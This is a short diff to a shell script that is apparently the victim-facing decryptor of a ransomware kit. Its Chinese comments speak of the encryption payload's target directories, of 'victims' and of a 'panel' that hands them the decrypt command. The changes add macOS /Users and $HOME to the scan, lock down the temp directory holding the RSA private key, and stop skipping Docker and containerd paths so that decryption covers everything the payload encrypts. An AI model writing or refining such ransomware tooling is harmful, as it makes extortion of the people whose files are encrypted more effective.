@@ -29,7 +29,12 @@ if [ -z "$DIRS" ]; then
     # 基准与载荷加密范围一致（载荷 roots），再自动补上真实挂载点，
     # 覆盖 /mnt/data、/data 这类自定义挂载（载荷的 SKIP_DIRS 会跳过 /mnt，
     # 但用户手动加密其他挂载点时仍能被这里兜住）。
-    DIRS="/home /root /var /opt /tmp /srv"
+    # ★ 必须包含 macOS 的 /Users：macOS 载荷的 roots 是 [~, '/Users', '/tmp']，
+    #   而 /home 在 macOS 上是空的 autofs、/root 不存在、/opt 与 /srv 通常也没有。
+    #   漏掉 /Users 就等于"解密全部"在 macOS 上一个用户文件都解不回来 ——
+    #   而面板给受害者的正是"不写目录=解密全部"这条命令。
+    #   $HOME 作兜底，以防管理员账号的家目录不在 /Users 下。
+    DIRS="/home /root /var /opt /tmp /srv /Users ${HOME:-}"
     if [ -r /proc/mounts ]; then
         EXTRA=$(awk '
             $2 ~ /^\// &&
@@ -48,7 +53,10 @@ if [ -z "$DIRS" ]; then
 fi
 
 TD="/tmp/.jdec_$$"
-mkdir -p "$TD" || exit 1
+(umask 077 && mkdir -p "$TD") || exit 1
+chmod 700 "$TD"
+# 必须收紧到 0700：默认 umask 022 下 $TD 是 0755、openssl 写出的 priv.pem 是
+# 0644 —— 多用户机器上，整个解密期间任何本地用户都能读到明文 RSA 私钥。
 trap 'rm -rf "$TD"' EXIT INT TERM
 
 OK=0
@@ -127,9 +135,13 @@ decrypt_one(){
 for D in $DIRS; do
     [ -d "$D" ] || continue
     # 排除容器层与伪文件系统：不是受害者数据，且会让全盘扫描慢几个数量级
-    find "$D" \
-        -path '/var/lib/docker' -prune -o \
-        -path '/var/lib/containerd' -prune -o \
+    # -H：把命令行给出的起点符号链接解开。macOS 上 /tmp 与 /var 都是指向
+    #     /private/* 的符号链接，不带 -H 时 find 不下钻，等于什么都没扫到。
+    # ★ 这里【不再】prune /var/lib/docker 与 /var/lib/containerd：
+    #   载荷的 SKIP_DIRS 里没有这两个路径，它们里面的文件确实会被加密，
+    #   而解密端却把整棵树剪掉 —— 默认范围下这些文件永远解不回来，
+    #   而且静默跳过、连 failed 都不计。解密范围必须等于加密范围。
+    find -H "$D" \
         -path '/proc' -prune -o \
         -path '/sys' -prune -o \
         -path '/dev' -prune -o \
